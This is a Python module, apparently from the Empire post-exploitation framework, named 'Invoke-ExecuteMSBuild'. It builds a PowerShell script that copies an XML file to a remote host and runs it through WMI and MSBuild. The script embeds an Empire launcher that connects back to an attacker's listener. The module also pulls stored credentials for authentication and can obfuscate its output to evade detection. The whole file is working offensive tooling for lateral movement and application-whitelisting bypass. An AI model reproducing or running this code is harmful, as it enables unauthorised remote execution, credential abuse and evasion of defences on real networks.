from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Invoke-ExecuteMSBuild',

            # list of one or more authors for the module
            'Author': ['@xorrior'],

            # more verbose multi-line description of the module
            'Description': ('This module utilizes WMI and MSBuild to compile and execute an xml file containing an Empire launcher'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # True if the module needs admin rights to run
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,
            
            # the language for this module
            'Language' : 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion' : '2',

            # list of any references/other comments
            'Comments': [
                'Inspired by @subtee',
                'http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to grab a screenshot from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''                
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ComputerName' : {
                'Description'   :   'Host to target',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   'UserName if executing with credentials',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password if executing with credentials',
                'Required'      :   False,
                'Value'         :   ''
            },
            'FilePath' : {
                'Description'   :   'Desired location to copy the xml file on the target',
                'Required'      :   False,
                'Value'         :   ''
            },
            'DriveLetter' : {
                'Description'   :   'Drive letter to use when mounting the share locally',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-ExecuteMSBuild.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = "Invoke-ExecuteMSBuild"
        credID = self.options["CredID"]['Value']
        if credID != "":
            
            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""

            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]

            if domainName != "":
                self.options["UserName"]['Value'] = str(domainName) + "\\" + str(userName)
            else:
                self.options["UserName"]['Value'] = str(userName)
            if password != "":
                self.options["Password"]['Value'] = password


        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""
        else:

            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
            if launcher == "":
                return ""
            else:
                launcher = launcher.replace('$','`$')
                script = script.replace('LAUNCHER',launcher)

        # add any arguments to the end execution of the script
        scriptEnd += " -ComputerName " + self.options['ComputerName']['Value']

        if self.options['UserName']['Value'] != "":
            scriptEnd += " -UserName \"" + self.options['UserName']['Value'] + "\" -Password \"" + self.options['Password']['Value'] + "\""

        if self.options['DriveLetter']['Value']:
            scriptEnd += " -DriveLetter \"" + self.options['DriveLetter']['Value'] + "\""

        if self.options['FilePath']['Value']:
            scriptEnd += " -FilePath \"" + self.options['FilePath']['Value'] + "\""

        scriptEnd += " | Out-String"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
